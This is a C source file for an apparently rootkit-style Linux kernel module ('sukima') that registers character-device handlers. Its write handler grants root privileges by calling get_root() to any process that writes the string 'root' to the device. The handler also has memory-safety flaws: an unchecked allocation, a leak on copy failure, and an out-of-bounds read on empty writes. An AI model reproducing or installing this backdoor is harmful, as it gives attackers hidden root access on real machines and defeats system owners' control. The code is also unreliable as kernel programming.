#include <linux/device.h>
#include <linux/fs.h>

#include "sukima.h"
#include "utils.h"

int sukima_open(struct inode *__inode, struct file *__file) {
    return 0;
}

ssize_t sukima_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff) {
    return 0;
}

ssize_t sukima_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff) {
    char *param = kmalloc(size + 1, GFP_KERNEL);

    if (copy_from_user(param, user_buf, size)) {
        return -EFAULT;
    }

    param[size] = '\0';
    if (param[size - 1] == '\n')
        param[size - 1] = '\0';

    if (!strcmp(param, "root")) {
        get_root();
        LOG_I("Give root permission success.");
    }

    kfree(param);

    return size;
}

int sukima_release(struct inode *__inode, struct file *__file) {
    return 0;
}

long sukima_ioctl(struct file *__file, unsigned int cmd, unsigned long param) {
    return 0;
}
